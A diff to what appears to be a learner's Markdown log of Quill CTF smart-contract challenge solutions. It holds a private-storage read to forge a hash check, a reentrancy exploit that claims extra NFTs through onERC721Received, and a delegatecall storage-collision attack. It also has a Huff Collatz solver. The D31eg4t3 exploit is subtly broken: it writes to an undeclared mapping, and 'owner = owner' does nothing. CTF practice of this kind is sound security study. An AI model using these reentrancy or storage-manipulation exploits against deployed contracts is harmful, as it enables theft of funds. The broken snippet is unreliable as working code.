@@ -809,4 +809,138 @@ contract VIPBankExploit{
 }
 ```
 
+### 2024.09.10
+
+- Quill CTF: Confidential Hash
+- Quill CTF: Safe NFT
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Confidential} from "../src/confidentialHash.sol";
+import {safeNFT} from "../src/safeNFT.sol";
+import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';
+
+contract CounterTest2 is Test {
+    Confidential public confidential;
+    safeNFT public nft;
+
+
+    function setUp() public {
+        confidential = new Confidential();
+        nft = new safeNFT("safe", "safe", 0.01 ether);
+    }
+
+    function test_solve_confidential() public {
+        bytes32 alice = vm.load(address(confidential), bytes32(uint256(4)));
+        bytes32 bob = vm.load(address(confidential), bytes32(uint256(9)));    
+        bytes32 mhash = keccak256(abi.encodePacked(alice, bob));
+        confidential.checkthehash(mhash);
+    }
+
+    function test_solve_nft() public {
+        SafeNFTExploit sne = new SafeNFTExploit(nft);
+        sne.exploit{value: 0.01 ether}();
+        assert( nft.balanceOf(address(sne)) > 1);
+    }
+
+}
+
+contract SafeNFTExploit is IERC721Receiver{
+
+  safeNFT private nft;
+  uint256 breaker;
+
+  constructor(safeNFT _nft ) {
+    nft = _nft;
+  }
+
+  function exploit() external payable {
+    nft.buyNFT{value: msg.value}();
+    nft.claim();
+  }
+
+
+  function onERC721Received(
+    address operator,
+    address from,
+    uint256 tokenId,
+    bytes calldata 
+  ) external override returns (bytes4) {
+
+    if(breaker == 0){
+        breaker += 1;
+        nft.claim();
+    }
+    
+    return IERC721Receiver.onERC721Received.selector;
+  }
+}
+```
+
+
+### 2024.09.11
+
+- Quill CTF: D31eg4t3
+
+![image](https://github.com/user-attachments/assets/cfa5ab91-11cf-437b-8f22-731ceb597e43)
+
+```solidity
+contract D31eg4t3Exploit {
+  uint a = 12345;
+  uint8 b = 32;
+  string private d; 
+  uint32 private c; 
+  string private mot; 
+  address public owner;
+  mapping(address => bool) public canYouHackMe; 
+
+  constructor(){
+    owner = msg.sender;
+  }
+
+  function attack(D31eg4t3 delegate) external {
+    (bool success, ) = delegate.hackMe("");
+    require(success, "hack me fail");
+  }
+
+  fallback() external {
+    owner = owner;
+    yesICan[owner] = true;
+  }
+}
+```
+
+### 2024.09.12
+
+- Quill CTF: Collatz Puzzle
+https://github.com/devtooligan/collatzPuzzle/blob/main/test/CollatzPuzzle.sol
+
+```huff
+#define macro MAIN() = takes (0) returns (0) {
+  0x04 calldataload    // Load the input value 'n' from calldata at offset 0x04
+  0x02                 // Push the constant 2 onto the stack
+  dup2                 // Duplicate 'n' on the stack
+  mod                  // Calculate n % 2 to check if 'n' is even or odd
+  iszero               // Check if (n % 2) == 0
+  handleEvenCase jumpi // If 'n' is even, jump to the 'handleEvenCase' label
+  0x03                 // Push the constant 3 onto the stack
+  mul                  // Calculate 3 * n
+  0x1                  // Push the constant 1 onto the stack
+  add                  // Calculate (3 * n) + 1
+  returnResult jump    // Jump to the 'returnResult' label to return the result
+  
+  handleEvenCase:
+  0x01                 // Push the constant 1 onto the stack 
+  shr                  // Calculate n >> 1 (equivalent to n / 2)
+ 
+ returnResult:
+  returndatasize mstore // Store the result in memory
+  calldatasize returndatasize return // Return the result
+    
+}
+```
+
 <!-- Content_END -->
